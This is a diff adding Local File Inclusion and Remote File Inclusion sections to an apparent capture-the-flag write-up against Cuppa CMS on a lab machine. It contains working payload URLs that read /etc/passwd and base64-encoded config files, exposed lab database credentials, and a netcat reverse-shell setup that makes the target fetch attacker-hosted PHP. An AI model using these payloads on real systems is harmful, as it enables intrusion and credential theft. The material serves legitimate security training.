@@ -370,9 +370,114 @@ searchsploit -m php/webapps/25971.txt
 ```
 </details>
 
+## Local File Inclusion (LFI)
+
+During the analysis of the Cuppa CMS administrator panel, a Local File Inclusion (LFI) vulnerability was identified in the file alertConfigField.php. The application dynamically includes server-side files based on the user-controlled parameter urlConfig without proper validation or sanitization.
+
+This behavior allows arbitrary local files to be included and rendered by the PHP interpreter. To confirm the vulnerability, the system file /etc/passwd was requested using an absolute path, which successfully returned its contents:
+
+http://TARGET/administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd
+<img src="./images/Captura de tela_2025-12-28_10-17-28.png" alt="/etc/passwd" whidth="1200">
+
+
+The successful disclosure of /etc/passwd confirms that the backend uses an insecure include() operation and accepts absolute file paths, proving full read access to local files on the server.
+
+🧪 Proof of Concept — Arbitrary File Read
+
+To confirm the vulnerability, the php://filter wrapper was used to safely read and encode a PHP file in Base64, avoiding direct execution.
+
+Payload used:
+
+http://10.66.167.158/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+<img src="./images/configphp.png" alt="config.php" whidth="1200">
+
+
+The request successfully returned a Base64-encoded response, confirming that arbitrary local files can be read via the urlConfig parameter.
+
+📌 Observations
+
+The parameter name is case-sensitive: only urlConfig is processed by the application.<br>
+The vulnerability allows reading sensitive files from the server.<br>
+This confirms the presence of a Local File Inclusion (LFI) vulnerability in the Cuppa CMS installation.<br>
 
 
 
+The decoded content revealed sensitive configuration details, including database credentials and application secrets:
+```bash
+echo "PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo/Pg==" | base64 -d
+```
+
+```php
+<?php 
+        class Configuration{
+                public $host = "localhost";
+                public $db = "cuppa";
+                public $user = "root";
+                public $password = "password123";
+                public $table_prefix = "cu_";
+                public $administrator_template = "default";
+                public $list_limit = 25;
+                public $token = "OBqIPqlFWf3X";
+                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
+                public $upload_default_path = "media/uploadsFiles";
+                public $maximum_file_size = "5242880";
+                public $secure_login = 0;
+                public $secure_login_value = "";
+                public $secure_login_redirect = "";
+        } 
+?>
+```
+## 📌 Impact
+
+- Full disclosure of database credentials (`root:password123`)
+  
+  > **Note:**  
+  > The retrieved `Configuration.php` file exposed database connection parameters, including the database name, host, and credentials. The presence of standard MySQL connection fields confirms that these credentials belong to the database user rather than a system or CMS account.
+
+- Exposure of an application security token
+- Identification of the file upload directory, which may be leveraged for further attacks
+- Confirmation that sensitive backend configuration files are readable due to improper input handling
+
+This significantly increases the attack surface and enables lateral movement, including database access and potential remote code execution.
+
+## Exploitation — Remote File Inclusion (RFI) to Remote Code Execution (RCE)
 
 
+### 1 - Preparation & Listener Setup
+  
+First, host the PHP reverse shell script and start a netcat listener to catch the connection.
 
+#### Host the payload:
+
+```bash
+# Start a Python HTTP server to serve the shell.txt (PHP code)
+python3 -m http.server 8000
+```
+#### Start the Listener:
+
+```bash
+# Open netcat to listen for the incoming reverse shell
+nc -lvnp 1234
+```
+### 2 - Execution Phase
+
+Inject the payload by passing the attacker's URL to the vulnerable parameter.
+
+#### Payload URL: 
+
+> http://<target_ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker_ip>:8000/shell.txt
+
+### 3 - Post-Exploitation & Shell Stabilization
+
+Once the connection is established, the shell is limited. We stabilize it using Python for a fully interactive TTY.
+
+#### Establishing TTY:
+```bash
+# Verify environment and upgrade to interactive bash
+/$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@skynet:/$ cd /home/milesdyson
+www-data@skynet:/home/milesdyson$ ls
+backups  mail  share  user.txt
+www-data@skynet:/home/milesdyson$ cat user.txt
+7ce5c2109a40f958099283600a9ae807
+```
